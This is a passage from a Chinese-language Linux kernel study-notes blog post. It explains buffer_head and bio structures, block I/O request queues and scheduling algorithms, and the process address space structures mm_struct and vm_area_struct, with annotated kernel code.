<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">get_bh</span><span class="params">(struct buffer_head *bh)</span> <span class="comment">/* 增加引用计数 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        atomic_inc(&amp;bh-&gt;b_count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">put_bh</span><span class="params">(struct buffer_head *bh)</span> <span class="comment">/* 减少引用计数 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        smp_mb__before_atomic();</span><br><span class="line">        atomic_dec(&amp;bh-&gt;b_count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>PS：在 2.6 版本的 Linux 内核中，许多 IO 操作都不依靠 <code>buffer_head</code>，而是直接对页面或地址空间进行操作来完成，并引入了一种更灵活且轻量级的容器 <code>bio</code> 结构体</p>
<p>二，bio 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * I/O操作的主要单元,针对I/O块和更低级的层(ie drivers and stacking drivers)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bio</span> &#123;</span></span><br><span class="line">    <span class="keyword">sector_t</span>        bi_sector;   	    <span class="comment">/* 磁盘上相关扇区 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bio</span>        *<span class="title">bi_next</span>;</span>  	  	<span class="comment">/* 请求列表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">block_device</span>    *<span class="title">bi_bdev</span>;</span> 	<span class="comment">/* 相关的块设备 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>        bi_flags;   	<span class="comment">/* 状态和命令标志 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>        bi_rw;      	<span class="comment">/* 读还是写 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span>        bi_vcnt;    	<span class="comment">/* bio_vecs的数目 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span>        bi_idx;       <span class="comment">/* bio_io_vect的当前索引 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 结合后的片段数目 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        bi_phys_segments;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        bi_size;    	<span class="comment">/* 剩余 I/O 计数 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 第一个和最后一个可合并的段的大小 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        bi_seg_front_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        bi_seg_back_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        bi_max_vecs;    <span class="comment">/* bio_vecs数目上限 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        bi_comp_cpu;    <span class="comment">/* 结束CPU */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">atomic_t</span>        bi_cnt;        		<span class="comment">/* 使用计数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span>        *<span class="title">bi_io_vec</span>;</span>   <span class="comment">/* bio_vec 链表 */</span></span><br><span class="line">    <span class="keyword">bio_end_io_t</span>        *bi_end_io; 	<span class="comment">/* I/O 完成方法 */</span></span><br><span class="line">    <span class="keyword">void</span>            *bi_private;    	<span class="comment">/* bio结构体创建者的私有方法 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_BLK_DEV_INTEGRITY)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bio_integrity_payload</span> *<span class="title">bi_integrity</span>;</span>  <span class="comment">/* data integrity */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">bio_destructor_t</span>    *bi_destructor;    <span class="comment">/* bio撤销方法 */</span></span><br><span class="line">    <span class="comment">/* 内嵌在结构体末尾的bio向量,主要为了防止出现二次申请少量的bio_vecs */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span>        <span class="title">bi_inline_vecs</span>[0];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>bio 结构体：表示正在执行的 I/O 操作相关的信息</li>
<li>bi_io_vec 链表：表示当前 I/O 操作涉及到的内存页（每个 bio_vec 都是对应一个页面 page，从而保证内核能够方便高效的完成 I/O 操作）</li>
<li>bio_vec 结构体：表示 I/O 操作使用的片段</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span>	*<span class="title">bv_page</span>;</span>		<span class="comment">/* 指向这个缓冲区所驻留的物理页 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>	bv_len;		<span class="comment">/* 这个缓冲区以字节为单位的大小 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>	bv_offset;	<span class="comment">/* 缓冲区所驻留的页中以字节为单位的偏移量 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>bi_vcnt：表示 bi_io_vec 链表中 bi_vec 的个数</li>
<li>bi_idx：表示当前的 bi_vec 片段的索引</li>
</ul>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1661472333928-1666871176498.png" class width="1661472333928"> 
<p><strong>请求队列</strong></p>
<p>块设备将它们挂起的块 IO 请求保存在请求队列 <code>request_queue</code> 中</p>
<p>队列中的请求由结构体 <code>request</code> 表示，一个请求可以由多个 <code>bio</code> 结构体组成</p>
<p><strong>内核I/O调度</strong></p>
<p>内核 I/O 调度程序通过两种方式来减少磁盘寻址时间：合并与排序</p>
<p>常见的内核 I/O 调度策略如下：</p>
<ul>
<li>Linus 电梯：<ul>
<li>为了保证磁盘寻址的效率，一般会尽量让磁头向一个方向移动，等到头了再反过来移动，这样可以缩短所有请求的磁盘寻址总时间</li>
<li>磁头的移动有点类似于电梯，所以这个 I/O 调度算法也叫电梯调度</li>
</ul>
</li>
<li>最终期限I/O调度：<ul>
<li>最终期限I/O调度算法类似于 Linus 电梯，但是给每个请求设置了超时时间，默认情况下，读请求的超时时间500ms，写请求的超时时间是5s</li>
</ul>
</li>
<li>预测I/O调度：<ul>
<li>基于最终期限I/O调度算法，新的读请求提交后，并不立即进行请求处理，而是有意等待片刻(默认是6ms)</li>
<li>等待期间如果有其他对磁盘相邻位置进行读操作的读请求加入，会立刻处理这些读请求</li>
<li>等待期间如果没有其他读请求加入，那么等待时间相当于浪费掉</li>
</ul>
</li>
<li>完全公正的排队I/O调度：<ul>
<li>完全公正的排队（Complete Fair Queuing，CFQ）I/O调度，是为专有工作负荷设计的，它和之前提到的I/O调度有根本的不同</li>
<li>CFQ I/O调度算法中，每个进程都有自己的I/O队列</li>
<li>CFQ I/O调度程序以时间片轮转调度队列，从每个队列中选取一定的请求数（默认4个），然后进行下一轮调度</li>
</ul>
</li>
<li>空操作的I/O调度：<ul>
<li>空操作I/O调度几乎不做什么事情，这也是它这样命名的原因</li>
<li>空操作I/O调度只做一件事情，当有新的请求到来时，把它与任一相邻的请求合并</li>
</ul>
</li>
</ul>
<p>Linux 内核中内置了上面4种I/O调度，可以在启动时通过命令行选项 <code>elevator=xxx</code> 来启用任何一种</p>
<p>elevator 选项参数如下:</p>
<div class="table-container">
<table>
<thead>
<tr>
<th><strong>参数</strong></th>
<th><strong>I/O调度程序</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>as</td>
<td>预测</td>
</tr>
<tr>
<td>cfq</td>
<td>完全公正排队</td>
</tr>
<tr>
<td>deadline</td>
<td>最终期限</td>
</tr>
<tr>
<td>noop</td>
<td>空操作</td>
</tr>
</tbody>
</table>
</div>
<h2 id="进程地址空间"><a href="#进程地址空间" class="headerlink" title="进程地址空间"></a>进程地址空间</h2><p><strong>地址空间</strong></p>
<p>进程地址空间也就是每个进程所使用的内存（就是每个进程所能访问的虚拟内存地址范围），内核对进程地址空间的管理，也就是对用户态程序的内存管理</p>
<ul>
<li>现代的操作系统中进程都是在保护模式下运行的，地址空间其实是操作系统给进程用的一段连续的虚拟内存空间</li>
<li>地址空间最终会通过页表映射到物理内存上，因为内核操作的是物理内存</li>
</ul>
<p>虽然地址空间的范围很大，但是进程也不一定有权限访问全部的地址空间（一般都是只能访问地址空间中的一些地址区间），进程能够访问的那些地址区间也称为 [内存区域]，进程如果访问了有效内存区域以外的内容就会报 “段错误” 信息</p>
<ul>
<li>[内存区域]：进程能够访问的那些 [地址区间]</li>
</ul>
<p>内存区域中主要包含以下信息：</p>
<ul>
<li>代码段 (text section)，即可执行文件代码的内存映射</li>
<li>数据段 (data section)，即可执行文件的已初始化全局变量的内存映射</li>
<li>bss 段的零页 (页面信息全是“0”值)，即未初始化全局变量的内存映射</li>
<li>进程用户空间栈的零页内存映射</li>
<li>进程使用的C库或者动态链接库等共享库的代码段，数据段和bss段的内存映射</li>
<li>任何内存映射文件</li>
<li>任何共享内存段</li>
<li>任何匿名内存映射，比如由 malloc() 分配的内存</li>
</ul>
<p>linux 中的地址空间是用 mm_struct 来表示的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> * <span class="title">mmap</span>;</span>        <span class="comment">/* [内存区域]单链表组织 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_root</span> <span class="title">mm_rb</span>;</span>                <span class="comment">/* [内存区域]红黑树组织 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> * <span class="title">mmap_cache</span>;</span>  <span class="comment">/* 最近一次访问的[内存区域] */</span></span><br><span class="line">    <span class="function"><span class="keyword">unsigned</span> <span class="title">long</span> <span class="params">(*get_unmapped_area)</span> <span class="params">(struct file *filp,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">unsigned</span> <span class="keyword">long</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">long</span> flags)</span></span>;  <span class="comment">/* 获取指定区间内一个还未映射的地址，出错时返回错误码 */</span></span><br><span class="line">    <span class="keyword">void</span> (*unmap_area) (struct mm_struct *mm, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr);  <span class="comment">/* 取消地址 addr 的映射 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> mmap_base;        <span class="comment">/* 地址空间中可以用来映射的首地址 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> task_size;        <span class="comment">/* 进程的虚拟地址空间大小 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cached_hole_size;     <span class="comment">/* 如果不空的话，就是 free_area_cache 后最大的空洞 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> free_area_cache;      <span class="comment">/* 地址空间的第一个空洞 */</span></span><br><span class="line">    <span class="keyword">pgd_t</span> * pgd;                        <span class="comment">/* 页全局目录 */</span></span><br><span class="line">    <span class="keyword">atomic_t</span> mm_users;            <span class="comment">/* 使用地址空间的用户数 */</span></span><br><span class="line">    <span class="keyword">atomic_t</span> mm_count;            <span class="comment">/* 实际使用地址空间的计数， (users count as 1) */</span></span><br><span class="line">    <span class="keyword">int</span> map_count;                <span class="comment">/* [内存区域]个数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">mmap_sem</span>;</span>   	<span class="comment">/* 内存区域信号量 */</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> page_table_lock;         <span class="comment">/* 页表锁 */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mmlist</span>;</span>       		<span class="comment">/* 所有地址空间形成的链表 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Special counters, in some configurations protected by the</span></span><br><span class="line"><span class="comment">     * page_table_lock, in other configurations by being atomic.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">mm_counter_t</span> _file_rss;</span><br><span class="line">    <span class="keyword">mm_counter_t</span> _anon_rss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> hiwater_rss;   	 <span class="comment">/* High-watermark of RSS usage */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> hiwater_vm;   	 <span class="comment">/* High-water virtual memory usage */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> total_vm, locked_vm, shared_vm, exec_vm;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_vm, reserved_vm, def_flags, nr_ptes;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> start_code, end_code, start_data, end_data; <span class="comment">/* 代码段,数据段的开始和结束地址 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> start_brk, brk, start_stack; <span class="comment">/* 堆的首地址,尾地址,进程栈首地址 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> arg_start, arg_end, env_start, env_end; <span class="comment">/* 命令行参数,环境变量首地址,尾地址 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> saved_auxv[AT_VECTOR_SIZE]; <span class="comment">/* for /proc/PID/auxv */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">linux_binfmt</span> *<span class="title">binfmt</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">cpumask_t</span> cpu_vm_mask;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Architecture-specific MM context */</span></span><br><span class="line">    <span class="keyword">mm_context_t</span> context;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Swap token stuff */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Last value of global fault stamp as seen by this process.</span></span><br><span class="line"><span class="comment">     * In other words, this value gives an indication of how long</span></span><br><span class="line"><span class="comment">     * it has been since this task got the token.</span></span><br><span class="line"><span class="comment">     * Look at mm/thrash.c</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> faultstamp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> token_priority;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> last_interval;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags; <span class="comment">/* Must use atomic bitops to access the bits */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">core_state</span> *<span class="title">core_state</span>;</span> <span class="comment">/* coredumping support */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_AIO</span></span><br><span class="line">    <span class="keyword">spinlock_t</span>        ioctx_lock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>    <span class="title">ioctx_list</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MM_OWNER</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * &quot;owner&quot; points to a task that is regarded as the canonical</span></span><br><span class="line"><span class="comment">     * user/owner of this mm. All of the following must be true in</span></span><br><span class="line"><span class="comment">     * order for it to be changed:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * current == mm-&gt;owner</span></span><br><span class="line"><span class="comment">     * current-&gt;mm != mm</span></span><br><span class="line"><span class="comment">     * new_owner-&gt;mm == mm</span></span><br><span class="line"><span class="comment">     * new_owner-&gt;alloc_lock is held</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PROC_FS</span></span><br><span class="line">    <span class="comment">/* store ref to file /proc/&lt;pid&gt;/exe symlink points to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">exe_file</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> num_exe_file_vmas;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MMU_NOTIFIER</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mmu_notifier_mm</span> *<span class="title">mmu_notifier_mm</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>mm_users：就是 mm_struct 被用户空间进程(线程)引用的次数 </li>
<li>mm_count：其实它记录就是 mm_struct 实际的引用计数 <ul>
<li>当 mm_users=0 时，并不一定能释放此 mm_struct，只有当 mm_count=0 时，才可以确定释放此 mm_struct</li>
<li>如果只有1个进程使用 mm_struct，那么 mm_users=1，mm_count也是 1</li>
<li>如果有9个线程在使用 mm_struct，那么 mm_users=9，而 mm_count 仍然为 1</li>
</ul>
</li>
</ul>
<p><strong>虚拟内存区域(VMA)</strong></p>
<p>[内存区域]（进程能够访问的那些 [地址区间]）在 linux 中也被称为 [虚拟内存区域]（VMA），它其实就是进程地址空间上一段连续的内存范围</p>
<p>结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> * <span class="title">vm_mm</span>;</span>    <span class="comment">/* 相关的 mm_struct 结构体 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_start;      <span class="comment">/* 内存区域首地址 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_end;        <span class="comment">/* 内存区域尾地址 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* linked list of VM areas per task, sorted by address */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vm_next</span>, *<span class="title">vm_prev</span>;</span>  <span class="comment">/* VMA链表 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pgprot_t</span> vm_page_prot;        <span class="comment">/* 访问控制权限 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_flags;       <span class="comment">/* 标志 */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">vm_rb</span>;</span>         <span class="comment">/* 树上的VMA节点 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * For areas with an address space and backing store,</span></span><br><span class="line"><span class="comment">     * linkage into the address_space-&gt;i_mmap prio tree, or</span></span><br><span class="line"><span class="comment">     * linkage to the list of like vmas hanging off its node, or</span></span><br><span class="line"><span class="comment">     * linkage of vma in the address_space-&gt;i_mmap_nonlinear list.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">            <span class="keyword">void</span> *parent;    <span class="comment">/* aligns with prio_tree_node parent */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">head</span>;</span></span><br><span class="line">        &#125; vm_set;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">raw_prio_tree_node</span> <span class="title">prio_tree_node</span>;</span></span><br><span class="line">    &#125; shared;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * A file&#x27;s MAP_PRIVATE vma can be in both i_mmap tree and anon_vma</span></span><br><span class="line"><span class="comment">     * list, after a COW of one of the file pages.    A MAP_SHARED vma</span></span><br><span class="line"><span class="comment">     * can only be in the i_mmap tree.  An anonymous MAP_PRIVATE, stack</span></span><br><span class="line"><span class="comment">     * or brk vma (with NULL file) can only be in an anon_vma list.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">anon_vma_node</span>;</span>    <span class="comment">/* 匿名vma对象链表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">anon_vma</span> *<span class="title">anon_vma</span>;</span>    	   <span class="comment">/* 匿名vma对象 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Function pointers to deal with this struct. */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span>	<span class="comment">/* 相关的操作表 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Information about our backing store: */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_pgoff;       		<span class="comment">/* Offset (within vm_file) in PAGE_SIZE</span></span><br><span class="line"><span class="comment">                       units, *not* PAGE_CACHE_SIZE */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">vm_file</span>;</span>        		<span class="comment">/* File we map to (can be NULL). */</span></span><br><span class="line">    <span class="keyword">void</span> * vm_private_data;       		<span class="comment">/* was vm_pte (shared mem) */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_truncate_count;	<span class="comment">/* truncate_count or restart_addr */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_region</span> *<span class="title">vm_region</span>;</span>    	<span class="comment">/* NOMMU mapping region */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mempolicy</span> *<span class="title">vm_policy</span>;</span>    	<span class="comment">/* NUMA policy for the VMA */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>虚拟内存区域（VMA）对应的操作表如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> 